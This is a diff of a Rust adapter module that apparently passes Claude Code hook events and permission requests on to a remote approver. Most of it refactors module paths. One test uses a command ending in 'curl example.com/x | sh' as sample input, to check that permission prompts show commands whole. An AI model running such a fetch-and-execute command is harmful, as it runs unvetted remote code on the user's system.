@@ -3,11 +3,12 @@
 //! row gives a role, before and after they run) with the hook's JSON on standard input.
 /// Claude Code's id: its row's, and the harness its agents report under.
 pub(crate) const HARNESS: &str = "claude-code";
-use super::env;
-use super::hooks::{On, on, text};
+use crate::adapters::env;
+use crate::adapters::hooks::{On, on, text};
 use airband_core::agent::{Agent, AgentEvent, Deliver, Event, PermissionAsk};
 use serde_json::Value;
 
+pub(crate) mod accounts;
 mod sessions;
 mod transcript;
 use sessions::*;
@@ -15,7 +16,7 @@ use transcript::*;
 
 /// The value of the variable the row names for `what`; nothing when the row names none.
 fn row_env(what: &str) -> Option<String> {
-    Some(super::row_says(HARNESS, what)).filter(|name| !name.is_empty()).and_then(|name| env(&name))
+    Some(crate::adapters::row_says(HARNESS, what)).filter(|name| !name.is_empty()).and_then(|name| env(&name))
 }
 
 /// The name he gave this session, if he gave one: with `/rename`, or as the name of its remote control
@@ -34,24 +35,24 @@ fn agent_of(hook: &Value) -> Option<Agent> {
     Some(Agent {
         cwd: text(hook, "cwd"),
         name: env("AIRBAND_NAME"),
-        // one the tower holds keeps the name it has (`super::as_held`)
+        // one the tower holds keeps the name it has (`crate::adapters::as_held`)
         title: session_name(hook),
         pid: row_env("pid_env").and_then(|p| p.parse().ok()),
-        // one the tower started and holds is reached through the input it holds, and no other way (`super::as_held`)
-        deliver: row_env("inbox_env").and_then(|s| s.strip_prefix(super::row_says(HARNESS, "inbox_scheme").as_str()).map(|path| Deliver::Socket { path: path.to_string(), token: row_env("inbox_token_env") })),
+        // one the tower started and holds is reached through the input it holds, and no other way (`crate::adapters::as_held`)
+        deliver: row_env("inbox_env").and_then(|s| s.strip_prefix(crate::adapters::row_says(HARNESS, "inbox_scheme").as_str()).map(|path| Deliver::Socket { path: path.to_string(), token: row_env("inbox_token_env") })),
         // where its transcript is, so the tower can ask what it is doing without a hook on every step
         meta: text(hook, "transcript_path").map(|t| serde_json::Map::from_iter([("transcript".to_string(), Value::String(t))])).unwrap_or_default(),
-        ..super::agent_with(text(hook, "session_id")?, HARNESS)
+        ..crate::adapters::agent_with(text(hook, "session_id")?, HARNESS)
     })
 }
 
 /// Claude Code is about to show a permission prompt (its `PermissionRequest` hook): the request to put to him.
 /// What he reads is the thing itself, not a description of it: the command, the file, the address.
 pub(crate) fn permission(hook: &Value) -> Option<PermissionAsk> {
-    let (tool, input) = super::hooks::permission_hook(hook).filter(|_| !headless())?;
+    let (tool, input) = crate::adapters::hooks::permission_hook(hook).filter(|_| !headless())?;
     // whole, never cut: what he reads is what will run
-    let row = super::hooks::tool_use(HARNESS, tool);
-    let what = super::hooks::asking(HARNESS, tool, input, None);
+    let row = crate::adapters::hooks::tool_use(HARNESS, tool);
+    let what = crate::adapters::hooks::asking(HARNESS, tool, input, None);
     // Its tool for asking him something is not a thing to allow: it is a question, put to him as one. One
     // question comes with the answers it offered; several are put together, for him to answer in his own words.
     let question = (row["role"].as_str() == Some("question")).then(|| {
@@ -65,12 +66,12 @@ pub(crate) fn permission(hook: &Value) -> Option<PermissionAsk> {
     })
     .filter(|q| !q.text.is_empty());
     // one too long to put in front of him whole is not asked on the phone: Claude Code asks at its keyboard
-    super::hooks::leave(agent_of(hook)?, tool, what, input, super::hooks::AT_KEYBOARD, question)
+    crate::adapters::hooks::leave(agent_of(hook)?, tool, what, input, crate::adapters::hooks::AT_KEYBOARD, question)
 }
 
 /// Which part of Claude Code's this tool call is, as its row has it.
 fn role(hook: &Value) -> Option<String> {
-    super::hooks::tool_use(HARNESS, hook["tool_name"].as_str()?)["role"].as_str().map(String::from)
+    crate::adapters::hooks::tool_use(HARNESS, hook["tool_name"].as_str()?)["role"].as_str().map(String::from)
 }
 /// Is this tool call Claude Code starting a subagent?
 fn is_subagent(hook: &Value) -> bool {
@@ -109,7 +110,7 @@ pub(crate) fn events(hook: &Value) -> Vec<AgentEvent> {
     if headless() {
         return Vec::new();
     }
-    let events = super::hooks::session_events(hook).unwrap_or_else(|| match hook["hook_event_name"].as_str() {
+    let events = crate::adapters::hooks::session_events(hook).unwrap_or_else(|| match hook["hook_event_name"].as_str() {
         // the notice that it has been idle only repeats the Stop that came just before it. Claude Code says
         // which kind a notice is; none is told from its wording.
         Some("Notification") => match text(hook, "message") {
@@ -126,7 +127,7 @@ pub(crate) fn events(hook: &Value) -> Vec<AgentEvent> {
     });
     // what its turn made that Claude Code wrote down itself comes first, so it goes with what the turn said
     let made = if matches!(hook["hook_event_name"].as_str(), Some("Stop" | "SessionStart")) { pull_requests(hook) } else { Vec::new() };
-    super::hooks::from_agent(agent_of(hook), made.into_iter().chain(events).collect())
+    crate::adapters::hooks::from_agent(agent_of(hook), made.into_iter().chain(events).collect())
 }
 
 /// The page the Artifact tool just published, from the tool's own answer. The tool says which of its actions
@@ -140,13 +141,13 @@ fn made_artifact(hook: &Value) -> Option<Event> {
     let answer = &hook["tool_response"];
     let address = answer["url"].as_str().filter(|a| airband_core::links::secure(a))?;
     let title = answer["title"].as_str().map(str::trim).filter(|t| !t.is_empty()).map(String::from);
-    Some(Event::Made { address: address.to_string(), title, kind: Some(super::row_says(HARNESS, "artifact_link")) })
+    Some(Event::Made { address: address.to_string(), title, kind: Some(crate::adapters::row_says(HARNESS, "artifact_link")) })
 }
 
 /// Is this a script calling `claude -p`? Those have nobody waiting on them, unless he asked to hear them or the
 /// tower runs it.
 fn headless() -> bool {
-    row_env("entry_env") == Some(super::row_says(HARNESS, "headless_entry")) && super::stand_in("AIRBAND_INCLUDE_HEADLESS").is_none() && !super::held()
+    row_env("entry_env") == Some(crate::adapters::row_says(HARNESS, "headless_entry")) && crate::adapters::stand_in("AIRBAND_INCLUDE_HEADLESS").is_none() && !crate::adapters::held()
 }
 
 /// A session id that can name a file: nothing in it may leave the folder.
@@ -158,17 +159,17 @@ fn file_safe(session: &str) -> bool {
 
 /// Where Claude Code keeps its settings, sessions and transcripts, as its row has it.
 fn claude_home() -> std::path::PathBuf {
-    super::tool_home(HARNESS)
+    crate::adapters::tool_home(HARNESS)
 }
 
 /// The Claude Code tools worth hearing about once they have run, by its row: the one that hands him a file,
 /// the one that publishes a page, and the one that runs a subagent.
 fn after_tools() -> String {
-    super::hooks::with_role(HARNESS, &["files", "artifact", "subagent"]).join("|")
+    crate::adapters::hooks::with_role(HARNESS, &["files", "artifact", "subagent"]).join("|")
 }
 /// The ones worth hearing about as they start: a subagent.
 fn before_tools() -> String {
-    super::hooks::with_role(HARNESS, &["subagent"]).join("|")
+    crate::adapters::hooks::with_role(HARNESS, &["subagent"]).join("|")
 }
 /// Permission is asked on the radio first. The time allowed is long because he is the one being waited for; the
 /// tower says how long to wait and the hook gives up by itself well before this.
@@ -183,42 +184,42 @@ const HOOKS: &[On] = &[
     on("PermissionRequest", 900),
 ];
 
-static ACCOUNTS: super::AccountBook = super::AccountBook { list: super::claude_accounts::list, switch: super::claude_accounts::switch, save: super::claude_accounts::save, add: super::claude_accounts::add, forget: super::claude_accounts::forget };
+static ACCOUNTS: crate::adapters::AccountBook = crate::adapters::AccountBook { list: accounts::list, switch: accounts::switch, save: accounts::save, add: accounts::add, forget: accounts::forget };
 
 pub(crate) struct ClaudeCode;
 
-impl super::Harness for ClaudeCode {
+impl crate::adapters::Harness for ClaudeCode {
     fn name(&self) -> &'static str {
         HARNESS
     }
     fn events(&self, hook: &Value) -> Vec<AgentEvent> {
         events(hook)
     }
-    fn hooks(&self) -> Option<super::hooks::File> {
-        Some(super::hooks::File { name: self.name(), path: claude_home().join(super::row_says(HARNESS, "hooks_file")), events: HOOKS })
+    fn hooks(&self) -> Option<crate::adapters::hooks::File> {
+        Some(crate::adapters::hooks::File { name: self.name(), path: claude_home().join(crate::adapters::row_says(HARNESS, "hooks_file")), events: HOOKS })
     }
     fn permission(&self, hook: &Value) -> Option<PermissionAsk> {
         permission(hook)
     }
-    fn accounts(&self) -> Option<&'static super::AccountBook> {
+    fn accounts(&self) -> Option<&'static crate::adapters::AccountBook> {
         Some(&ACCOUNTS)
     }
-    fn glance(&self, agent: &Agent) -> super::Glance {
+    fn glance(&self, agent: &Agent) -> crate::adapters::Glance {
         glance(agent)
     }
     fn touched(&self, agent: &Agent) -> Vec<String> {
         touched(agent)
     }
-    fn told(&self, agent: &Agent, from: u64) -> (Vec<super::Told>, u64) {
+    fn told(&self, agent: &Agent, from: u64) -> (Vec<crate::adapters::Told>, u64) {
         told(agent, from)
     }
     fn steps(&self, agent: &Agent, since: u64) -> Vec<String> {
         steps(agent, since)
     }
-    fn open(&self) -> Option<Vec<super::Open>> {
+    fn open(&self) -> Option<Vec<crate::adapters::Open>> {
         open_in(&claude_home(), &running)
     }
-    fn worked(&self) -> Vec<super::Worked> {
+    fn worked(&self) -> Vec<crate::adapters::Worked> {
         worked_in(&claude_home())
     }
 }
@@ -256,11 +257,9 @@ mod tests {
     #[test]
     fn a_moved_home_is_where_hooks_and_sessions_are_looked_for_as_the_accounts_look() {
         // the variable is the row's, the same one the accounts and a sign-in use
-        assert_eq!(super::super::row_says(HARNESS, "home_env"), "CLAUDE_CONFIG_DIR");
-        assert_eq!(super::super::home_given(HARNESS, Some("/elsewhere/claude".into())), std::path::PathBuf::from("/elsewhere/claude"));
-        assert_eq!(super::super::home_given(HARNESS, None), crate::config::home().join(".claude"));
-        // every tool by the same rule, from its own row
-        assert_eq!(super::super::home_given("opencode", None), crate::config::home().join(".local/state"));
+        assert_eq!(crate::adapters::row_says(HARNESS, "home_env"), "CLAUDE_CONFIG_DIR");
+        assert_eq!(crate::adapters::home_given(HARNESS, Some("/elsewhere/claude".into())), std::path::PathBuf::from("/elsewhere/claude"));
+        assert_eq!(crate::adapters::home_given(HARNESS, None), crate::config::home().join(".claude"));
     }
 
     /// A hook is read with the environment and home the test gives it, never this process's: run from inside one of
@@ -277,10 +276,10 @@ mod tests {
         // a session record under the given home names the session; nothing is read from his own
         std::fs::create_dir_all(home.join(".claude/sessions")).unwrap();
         std::fs::write(home.join(".claude/sessions/77.json"), json!({ "sessionId": "s1", "name": "shop", "nameSource": "user" }).to_string()).unwrap();
-        crate::adapters::test_env::set(&super::super::row_says(HARNESS, "pid_env"), "77");
+        crate::adapters::test_env::set(&crate::adapters::row_says(HARNESS, "pid_env"), "77");
         assert_eq!(agent_of(&hook).unwrap().title.as_deref(), Some("shop"));
         // a one-off run, by what the test says, reports nothing
-        crate::adapters::test_env::set(&super::super::row_says(HARNESS, "entry_env"), &super::super::row_says(HARNESS, "headless_entry"));
+        crate::adapters::test_env::set(&crate::adapters::row_says(HARNESS, "entry_env"), &crate::adapters::row_says(HARNESS, "headless_entry"));
         assert!(events(&hook).is_empty());
         crate::adapters::test_env::clear();
         assert_eq!(events(&hook).len(), 1);
@@ -393,7 +392,7 @@ mod tests {
         let long = format!("git status && {} && curl example.com/x | sh", "true && ".repeat(40).trim_end_matches(" && "));
         assert_eq!(ask("Bash", json!({ "command": long })), format!("run `{long}`"));
         // one too long to show whole is not asked on the phone at all
-        assert!(permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": { "command": "x".repeat(super::super::hooks::SHOWN_WHOLE + 1) } })).is_none());
+        assert!(permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": { "command": "x".repeat(crate::adapters::hooks::SHOWN_WHOLE + 1) } })).is_none());
         // any other notification is not a request
         assert!(permission(&json!({ "session_id": "s1", "hook_event_name": "Stop" })).is_none());
         // the answers, as Claude Code reads them
@@ -401,12 +400,12 @@ mod tests {
         // its asking tool is a question to him, with the answers it offered, and his answer goes back in the tool's place
         let asked = permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "AskUserQuestion", "tool_input": { "questions": [{ "question": "Free space on which disk?", "options": [{ "label": "The NAS" }, { "label": "The internal disk" }] }] } })).unwrap();
         assert_eq!(asked.question, Some(airband_core::agent::Asked { text: "Free space on which disk?".into(), choices: vec!["The NAS".into(), "The internal disk".into()] }));
-        let answered: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &asked, false, "The NAS")).unwrap();
+        let answered: Value = serde_json::from_str(&crate::adapters::Harness::permission_answer(&ClaudeCode, &asked, false, "The NAS")).unwrap();
         assert_eq!(answered["hookSpecificOutput"]["decision"]["behavior"], "deny");
         assert!(answered["hookSpecificOutput"]["decision"]["message"].as_str().unwrap().contains("His answer: The NAS"));
-        let yes: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &plain, true, "")).unwrap();
+        let yes: Value = serde_json::from_str(&crate::adapters::Harness::permission_answer(&ClaudeCode, &plain, true, "")).unwrap();
         assert_eq!(yes["hookSpecificOutput"]["decision"], json!({ "behavior": "allow" }));
-        let no: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &plain, false, "use staging")).unwrap();
+        let no: Value = serde_json::from_str(&crate::adapters::Harness::permission_answer(&ClaudeCode, &plain, false, "use staging")).unwrap();
         assert_eq!(no["hookSpecificOutput"]["decision"]["behavior"], "deny");
         assert!(no["hookSpecificOutput"]["decision"]["message"].as_str().unwrap().ends_with("use staging"));
     }
@@ -533,3 +532,8 @@ mod tests {
         assert_eq!(step_in("nothing here"), None);
     }
 }
+
+#[cfg(test)]
+mod golden;
+#[cfg(test)]
+mod row;
